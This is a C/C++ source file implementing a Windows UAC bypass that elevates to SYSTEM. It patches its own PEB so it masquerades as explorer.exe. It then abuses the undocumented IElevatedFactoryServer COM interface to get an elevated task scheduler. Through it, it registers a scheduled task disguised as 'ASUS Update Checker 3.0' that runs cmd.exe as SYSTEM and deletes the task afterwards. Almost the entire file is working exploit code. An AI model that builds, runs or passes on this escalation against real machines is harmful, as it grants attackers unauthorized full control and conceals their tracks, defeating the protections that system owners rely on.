/*
UAC bypass with IElevatedFactoryServer COM interface from zcgonvh
https://github.com/zcgonvh/TaskSchedulerMisc
https://github.com/hfiref0x/UACME
https://github.com/evilashz/PigScheduleTask
https://fuzzysecurity.com/tutorials/27.html
https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC

It leverages the undocumented IElevatedFactoryServer COM component implemented by
C:\Windows\System32\shpafact.dll. IElevatedFactoryServer can instantiate an elevated ITaskService
component, which can be used to create a task in an elevated context.
It both bypasses UAC and elevate to SYSTEM (if needed).
*/

#include <comdef.h>
#include <taskschd.h>
#include <combaseapi.h>
#include <Windows.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

// Default payload is cmd.exe
static const wchar_t* xml =
L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
L"<Task version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
L"  <RegistrationInfo>\n"
L"    <Description>ASUS Update Checker 3.0</Description>\n"
L"  </RegistrationInfo>\n"
L"  <Triggers />\n"
L"  <Settings>\n"
L"    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n"
L"    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n"
L"    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n"
L"    <AllowHardTerminate>true</AllowHardTerminate>\n"
L"    <StartWhenAvailable>false</StartWhenAvailable>\n"
L"    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n"
L"    <IdleSettings>\n"
L"      <Duration>PT10M</Duration>\n"
L"		<WaitTimeout>PT1H</WaitTimeout>\n"
L"      <StopOnIdleEnd>false</StopOnIdleEnd>\n"
L"      <RestartOnIdle>false</RestartOnIdle>\n"
L"    </IdleSettings>\n"
L"    <AllowStartOnDemand>true</AllowStartOnDemand>\n"
L"    <Enabled>true</Enabled>\n"
L"    <Hidden>false</Hidden>\n"
L"    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n"
L"    <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>\n"
L"    <WakeToRun>false</WakeToRun>\n"
L"    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n"
L"    <Priority>7</Priority>\n"
L"  </Settings>\n"
L"  <Actions Context=\"Author\">\n"
L"    <Exec>\n"
// Change the payload command here
L"      <Command>cmd.exe</Command>\n"
L"    </Exec>\n"
L"  </Actions>\n"
L"  <Principals>\n"
L"    <Principal id=\"Author\">\n"
L"      <UserId>SYSTEM</UserId>\n" // Spawn as SYSTEM
L"      <RunLevel>HighestAvailable</RunLevel>\n"
L"    </Principal>\n"
L"  </Principals>\n"
L"</Task>\n";

typedef interface IElevatedFactoryServer IElevatedFactoryServer;
typedef struct IElevatedFactoryServerVtbl {
    BEGIN_INTERFACE

        HRESULT(STDMETHODCALLTYPE* QueryInterface)(
            __RPC__in IElevatedFactoryServer* This,
            __RPC__in REFIID riid,
            _COM_Outptr_ void** ppvObject);

    ULONG(STDMETHODCALLTYPE* AddRef)(
        __RPC__in IElevatedFactoryServer* This);

    ULONG(STDMETHODCALLTYPE* Release)(
        __RPC__in IElevatedFactoryServer* This);

    HRESULT(STDMETHODCALLTYPE* ServerCreateElevatedObject)(
        __RPC__in IElevatedFactoryServer* This,
        __RPC__in REFCLSID rclsid,
        __RPC__in REFIID riid,
        _COM_Outptr_ void** ppvObject);

    // Incomplete definition
    END_INTERFACE

} *PIElevatedFactoryServerVtbl;
interface IElevatedFactoryServer { CONST_VTBL struct IElevatedFactoryServerVtbl* lpVtbl; };

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    DWORD ProcessInformationClass,
    PVOID ProcessInformation,
    DWORD ProcessInformationLength,
    PDWORD ReturnLength
    );

typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(
    PRTL_CRITICAL_SECTION CriticalSection
    );

typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(
    PRTL_CRITICAL_SECTION CriticalSection
    );

typedef void (WINAPI* _RtlInitUnicodeString)(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
    );

typedef struct _PROCESS_BASIC_INFORMATION
{
    LONG ExitStatus;
    PVOID PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR ParentProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    };
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    WORD LoadCount;
    WORD TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE           Reserved1[16];
    PVOID          Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsLegacyProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN SpareBits : 3;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
} PEB, * PPEB;

/*
Patch the PEB to make the OS think the current process is explorer.exe.
COM objects rely on the Process Status API (PSAPI) to identify which process they are running in.
Patching the PEB fools the PSAPI checks.
Explained here: https://fuzzysecurity.com/tutorials/27.html
PowerShell implementation: https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Masquerade-PEB.ps1
*/
BOOL patch_peb() {
    // Resolve required functions
    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
    _RtlEnterCriticalSection pRtlEnterCriticalSection = (_RtlEnterCriticalSection)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEnterCriticalSection");
    _RtlLeaveCriticalSection pRtlLeaveCriticalSection = (_RtlLeaveCriticalSection)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlLeaveCriticalSection");
    _RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
    if (pNtQueryInformationProcess == NULL ||
        pRtlEnterCriticalSection == NULL ||
        pRtlLeaveCriticalSection == NULL ||
        pRtlInitUnicodeString == NULL) {
        printf("[!] GetProcAddress failed.\n");
        return FALSE;
    }

    // Open an handle to the current process
    DWORD current_proc_pid = GetCurrentProcessId();
    HANDLE current_proc = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
        FALSE,
        current_proc_pid
    );
    if (current_proc == NULL) {
        printf("[!] OpenProcess failed.\n");
        return FALSE;
    }

    // Query process information
    PROCESS_BASIC_INFORMATION pbi;
    pNtQueryInformationProcess(
        current_proc,
        0,
        &pbi,
        sizeof(pbi),
        NULL
    );
    
    // Get the PEB address
    PPEB peb = NULL;
    if (!ReadProcessMemory(
        current_proc,
        &pbi.PebBaseAddress,
        &peb,
        sizeof(peb),
        NULL
    )) {
        printf("[!] ReadProcessMemory failed.\n");
        CloseHandle(current_proc);
        return FALSE;
    }

    // Get the LDR_DATA information
    PPEB_LDR_DATA pld = NULL;
    if (!ReadProcessMemory(
        current_proc,
        &peb->Ldr,
        &pld,
        sizeof(pld),
        NULL
    )) {
        printf("[!] ReadProcessMemory failed.\n");
        CloseHandle(current_proc);
        return FALSE;
    }

    // Prepare explorer.exe full path
    WCHAR explorer[MAX_PATH + 1] = { 0 };
    GetWindowsDirectory(explorer, MAX_PATH);
    wcscat_s(explorer, sizeof(explorer) / sizeof(wchar_t), L"\\explorer.exe");
    // Allocate on the heap (it must be valid after the function returns)
    LPWSTR explorer_path = (LPWSTR)malloc(MAX_PATH);
    if (explorer_path == NULL) {
        printf("[!] malloc failed.\n");
        CloseHandle(current_proc);
        return FALSE;
    }
    wcscpy_s(explorer_path, MAX_PATH, explorer);

    // Take ownership of the PEB
    pRtlEnterCriticalSection(peb->FastPebLock);
    // Masquerade ImagePathName and CommandLine
    pRtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, explorer_path);
    pRtlInitUnicodeString(&peb->ProcessParameters->CommandLine, explorer_path);

    
    // Iterate over all loaded modules and patch the module name matching the executable
    // Get the executable module name
    WCHAR exe_file_name[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, exe_file_name, MAX_PATH);

    WCHAR module_name[MAX_PATH] = { 0 };
    LPVOID flink = pld->InLoadOrderModuleList.Flink;
    LPVOID first_flink = flink;
    PLDR_DATA_TABLE_ENTRY data_table_entry = NULL;
    do {
        // Read the address of the current entry
        if (!ReadProcessMemory(
            current_proc,
            &flink,
            &data_table_entry,
            sizeof(data_table_entry),
            NULL
        )) {
            printf("[!] ReadProcessMemory failed.\n");
            CloseHandle(current_proc);
            return FALSE;
        }

        // Read the current entry
        if (!ReadProcessMemory(
            current_proc,
            data_table_entry->FullDllName.Buffer,
            &module_name,
            data_table_entry->FullDllName.MaximumLength,
            NULL
        )) {
            printf("[!] ReadProcessMemory failed.\n");
            CloseHandle(current_proc);
            return FALSE;
        }
        
        // Compare the entry with the current module name
        // If they match, patch the entry
        if (_wcsicmp(exe_file_name, module_name) == 0) {
            pRtlInitUnicodeString(
                &data_table_entry->FullDllName,
                explorer_path
            );
            pRtlInitUnicodeString(
                &data_table_entry->BaseDllName,
                explorer_path
            );
            break;
        }
        // Rotate to the next entry
        flink = data_table_entry->InLoadOrderLinks.Flink;
    } while (flink != first_flink);

    // Release lock on PEB
    pRtlLeaveCriticalSection(peb->FastPebLock);
    CloseHandle(current_proc);
    return TRUE;
}

BOOL bypassuac() {
    HRESULT result = 0;

    // Initialize COM
    result = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(result)) {
        printf("[!] CoInitializeEx failed.\n");
        return FALSE;
    }

    result = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        0,
        NULL
    );
    if (FAILED(result)) {
        printf("[!] CoInitializeSecurity failed.\n");
        return FALSE;
    }

    // Get the IElevatedFactoryServer instance
    IElevatedFactoryServer* elevated_factory_server = NULL;
    // {A6BFEA43-501F-456F-A845-983D3AD7B8F0} is the CLSID (it references the class)
    const WCHAR* object_name = L"Elevation:Administrator!new:{A6BFEA43-501F-456F-A845-983D3AD7B8F0}";
    // {804bd226-af47-4d71-b492-443a57610b08} is the RIID (it references the interface)
    GUID elevated_factory_server_riid;
    CLSIDFromString(L"{804bd226-af47-4d71-b492-443a57610b08}", &elevated_factory_server_riid);
    // Set the options
    BIND_OPTS3 opt;
    memset(&opt, 0, sizeof(opt));
    opt.cbStruct = sizeof(opt);
    opt.dwClassContext = CLSCTX_LOCAL_SERVER;
    // Get the target object
    result = CoGetObject(
        object_name,
        &opt,
        elevated_factory_server_riid,
        (void**)&elevated_factory_server
    );
    if (FAILED(result)) {
        printf("[!] CoGetObject failed.\n");
        CoUninitialize();
        return FALSE;
    }

    // Get the elevated task scheduler instance {0f87369f-a4e5-4cfc-bd3e-73e6154572dd}
    GUID task_scheduler_clsid;
    CLSIDFromString(L"{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}", &task_scheduler_clsid);
    ITaskService* task_service = NULL;
    result = elevated_factory_server->lpVtbl->ServerCreateElevatedObject(
        elevated_factory_server,
        task_scheduler_clsid,
        IID_ITaskService,
        (void**)&task_service
    );
    if (FAILED(result) || task_service == NULL) {
        printf("[!] ServerCreateElevatedObject failed.\n");
        CoUninitialize();
        return FALSE;
    }

    // Create a scheduled tasks leveraging the elevated ITaskService instance
    // https://learn.microsoft.com/en-us/windows/win32/taskschd/boot-trigger-example--c---
    // Step 1: connect to the task service
    result = task_service->Connect(
        _variant_t(),
        _variant_t(),
        _variant_t(),
        _variant_t()
    );
    if (FAILED(result)) {
        printf("[!] Connect to service failed.\n");
        CoUninitialize();
        return FALSE;
    }
    // Step 2: Get a pointer to the root task folder
    ITaskFolder* root_task_folder;
    result = task_service->GetFolder(_bstr_t(L"\\"), &root_task_folder);
    if (FAILED(result)) {
        printf("[!] GetFolder failed.\n");
        CoUninitialize();
        return FALSE;
    }
    
    // Step 3: Remove the task if already present
    LPCWSTR taskname = L"Test task";
    root_task_folder->DeleteTask(_bstr_t(taskname), 0);

    // Step 4: Register the task
    IRegisteredTask* registered_task = NULL;
    result = root_task_folder->RegisterTask(
        _bstr_t(taskname),
        _bstr_t(xml),
        0,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(),
        &registered_task
    );
    if (FAILED(result) || registered_task == NULL) {
        printf("[!] RegisterTask failed.\n");
        CoUninitialize();
        return FALSE;
    }

    // Step 5: Run the task
    IRunningTask* running_task = NULL;
    result = registered_task->Run(_variant_t(), &running_task);
    if (FAILED(result) || running_task == NULL) {
        printf("[!] Run task failed.\n");
        CoUninitialize();
        return FALSE;
    }

    // Step 6: Clean up
    root_task_folder->DeleteTask(_bstr_t(taskname), 0);

    CoUninitialize();
    return TRUE;
}

int main()
{
    if (!patch_peb()) {
        return -1;
    }

    if (!bypassuac()) {
        return -1;
    }
}
